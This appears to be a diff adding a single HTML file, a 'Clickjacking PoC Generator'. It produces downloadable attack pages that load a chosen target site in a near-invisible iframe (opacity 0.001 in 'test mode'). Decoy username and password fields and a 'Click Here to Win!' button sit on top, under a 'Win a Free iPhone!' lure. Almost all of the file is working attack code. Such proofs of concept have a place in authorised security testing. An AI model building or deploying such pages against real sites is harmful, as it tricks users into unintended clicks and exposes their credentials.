@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking PoC Generator</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 350px 1fr;
+            gap: 20px;
+        }
+
+        .panel {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+
+        h1, h2, h3 {
+            color: #00d9ff;
+            margin-bottom: 15px;
+        }
+
+        .control-group {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #0f3460;
+            border-radius: 5px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #00d9ff;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #00d9ff;
+            background: #16213e;
+            color: #eee;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+
+        input[type="range"] {
+            width: 100%;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #00d9ff;
+            color: #16213e;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #00b8d4;
+        }
+
+        .preview-container {
+            position: relative;
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            height: 800px;
+        }
+
+        #preview-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .code-view {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-height: 400px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+        }
+
+        .slider-value {
+            display: inline-block;
+            background: #00d9ff;
+            color: #16213e;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        .element-config {
+            background: #1a1a2e;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border-left: 3px solid #00d9ff;
+        }
+
+        .position-controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Control Panel -->
+        <div class="panel">
+            <h1>Clickjacking Tool</h1>
+            
+            <div class="control-group">
+                <h3>Target Configuration</h3>
+                <label>Target URL:</label>
+                <input type="text" id="target-url" placeholder="https://example.com/login">
+                <button onclick="loadTarget()">Load Target</button>
+            </div>
+
+            <div class="control-group">
+                <h3>IFrame Settings</h3>
+                <label>Opacity: <span class="slider-value" id="opacity-value">0.50</span></label>
+                <input type="range" id="opacity" min="0" max="100" value="50" oninput="updateOpacity()">
+                
+                <div class="position-controls">
+                    <div>
+                        <label>Top (px):</label>
+                        <input type="number" id="iframe-top" value="0" oninput="updatePreview()">
+                    </div>
+                    <div>
+                        <label>Left (px):</label>
+                        <input type="number" id="iframe-left" value="0" oninput="updatePreview()">
+                    </div>
+                </div>
+            </div>
+
+            <div class="control-group">
+                <h3>Decoy Elements</h3>
+                
+                <div class="element-config">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="username-enabled" checked onchange="updatePreview()">
+                        <span>Username Field</span>
+                    </label>
+                    <input type="text" id="username-placeholder" value="Enter your email..." onchange="updatePreview()">
+                    <div class="position-controls">
+                        <div>
+                            <label>Top:</label>
+                            <input type="number" id="username-top" value="200" oninput="updatePreview()">
+                        </div>
+                        <div>
+                            <label>Left:</label>
+                            <input type="number" id="username-left" value="300" oninput="updatePreview()">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="element-config">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="password-enabled" checked onchange="updatePreview()">
+                        <span>Password Field</span>
+                    </label>
+                    <input type="text" id="password-placeholder" value="Enter your password..." onchange="updatePreview()">
+                    <div class="position-controls">
+                        <div>
+                            <label>Top:</label>
+                            <input type="number" id="password-top" value="250" oninput="updatePreview()">
+                        </div>
+                        <div>
+                            <label>Left:</label>
+                            <input type="number" id="password-left" value="300" oninput="updatePreview()">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="element-config">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="submit-enabled" checked onchange="updatePreview()">
+                        <span>Submit Button</span>
+                    </label>
+                    <input type="text" id="submit-text" value="Click Here to Win!" onchange="updatePreview()">
+                    <div class="position-controls">
+                        <div>
+                            <label>Top:</label>
+                            <input type="number" id="submit-top" value="300" oninput="updatePreview()">
+                        </div>
+                        <div>
+                            <label>Left:</label>
+                            <input type="number" id="submit-left" value="300" oninput="updatePreview()">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="control-group">
+                <h3>Decoy Content</h3>
+                <label>Title:</label>
+                <input type="text" id="decoy-title" value="Win a Free iPhone!" onchange="updatePreview()">
+                <label>Message:</label>
+                <textarea id="decoy-message" rows="4" onchange="updatePreview()">Congratulations! You've been selected to win a FREE iPhone 15 Pro!
+
+Enter your details below to claim your prize:</textarea>
+            </div>
+
+            <button onclick="generatePoC()">Generate PoC</button>
+            <button onclick="downloadPoC()">Download HTML</button>
+            <button onclick="toggleMode()">Toggle Test Mode</button>
+        </div>
+
+        <!-- Preview Panel -->
+        <div class="panel">
+            <h2>Live Preview</h2>
+            <div class="preview-container">
+                <iframe id="preview-frame"></iframe>
+            </div>
+            
+            <h3 style="margin-top: 20px;">Generated HTML Code</h3>
+            <div class="code-view" id="code-view"></div>
+            <button onclick="copyCode()">Copy Code</button>
+        </div>
+    </div>
+
+    <script>
+        let testMode = false;
+
+        function updateOpacity() {
+            const value = document.getElementById('opacity').value;
+            document.getElementById('opacity-value').textContent = (value / 100).toFixed(2);
+            updatePreview();
+        }
+
+        function updatePreview() {
+            const html = generateHTML();
+            const frame = document.getElementById('preview-frame');
+            frame.srcdoc = html;
+            document.getElementById('code-view').textContent = html;
+        }
+
+        function generateHTML() {
+            const targetUrl = document.getElementById('target-url').value || 'about:blank';
+            const opacity = testMode ? 0.001 : document.getElementById('opacity').value / 100;
+            const iframeTop = document.getElementById('iframe-top').value;
+            const iframeLeft = document.getElementById('iframe-left').value;
+            
+            const title = document.getElementById('decoy-title').value;
+            const message = document.getElementById('decoy-message').value;
+
+            let overlayHTML = '';
+
+            // Username field
+            if (document.getElementById('username-enabled').checked) {
+                const placeholder = document.getElementById('username-placeholder').value;
+                const top = document.getElementById('username-top').value;
+                const left = document.getElementById('username-left').value;
+                
+                overlayHTML += `
+                <input type="text" 
+                       placeholder="${placeholder}"
+                       style="position: absolute; top: ${top}px; left: ${left}px; padding: 10px; width: 250px; font-size: 14px; border: 2px solid #4CAF50; border-radius: 5px; z-index: 2;">
+                `;
+            }
+
+            // Password field
+            if (document.getElementById('password-enabled').checked) {
+                const placeholder = document.getElementById('password-placeholder').value;
+                const top = document.getElementById('password-top').value;
+                const left = document.getElementById('password-left').value;
+                
+                overlayHTML += `
+                <input type="password" 
+                       placeholder="${placeholder}"
+                       style="position: absolute; top: ${top}px; left: ${left}px; padding: 10px; width: 250px; font-size: 14px; border: 2px solid #4CAF50; border-radius: 5px; z-index: 2;">
+                `;
+            }
+
+            // Submit button
+            if (document.getElementById('submit-enabled').checked) {
+                const text = document.getElementById('submit-text').value;
+                const top = document.getElementById('submit-top').value;
+                const left = document.getElementById('submit-left').value;
+                
+                overlayHTML += `
+                <button style="position: absolute; top: ${top}px; left: ${left}px; padding: 12px 30px; background: #4CAF50; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; z-index: 2; font-weight: bold;">
+                    ${text}
+                </button>
+                `;
+            }
+
+            return `<!DOCTYPE html>
+<html>
+<head>
+    <title>${title}</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            position: relative;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .message {
+            background: #fffacd;
+            border-left: 4px solid #ffd700;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            white-space: pre-wrap;
+        }
+        iframe {
+            position: absolute;
+            top: ${iframeTop}px;
+            left: ${iframeLeft}px;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: ${opacity};
+            z-index: 1;
+        }
+        .warning {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #ff4444;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            z-index: 9999;
+            display: ${testMode ? 'none' : 'block'};
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">⚠️ POSITION MODE</div>
+    <div class="container">
+        <h1>${title}</h1>
+        <div class="message">${message}</div>
+        <div style="position: relative; z-index: 2;">
+            ${overlayHTML}
+        </div>
+        <iframe src="${targetUrl}"></iframe>
+    </div>
+</body>
+</html>`;
+        }
+
+        function loadTarget() {
+            updatePreview();
+        }
+
+        function generatePoC() {
+            updatePreview();
+            alert('PoC generated! See the code below.');
+        }
+
+        function downloadPoC() {
+            const html = generateHTML();
+            const blob = new Blob([html], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'clickjacking_poc.html';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function copyCode() {
+            const code = document.getElementById('code-view').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                alert('Code copied to clipboard!');
+            });
+        }
+
+        function toggleMode() {
+            testMode = !testMode;
+            document.getElementById('opacity').value = testMode ? 1 : 50;
+            updateOpacity();
+        }
+
+        // Initial load
+        updatePreview();
+    </script>
+</body>
+</html>
